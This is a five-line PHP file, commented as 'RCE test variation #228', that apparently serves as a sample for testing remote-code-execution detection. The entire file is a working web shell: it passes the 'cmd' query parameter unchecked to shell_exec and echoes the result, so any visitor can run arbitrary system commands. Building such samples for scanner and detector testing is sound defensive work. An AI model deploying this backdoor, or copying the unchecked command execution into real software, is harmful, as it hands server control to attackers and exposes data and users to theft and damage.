<?php
// RCE test variation #228
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>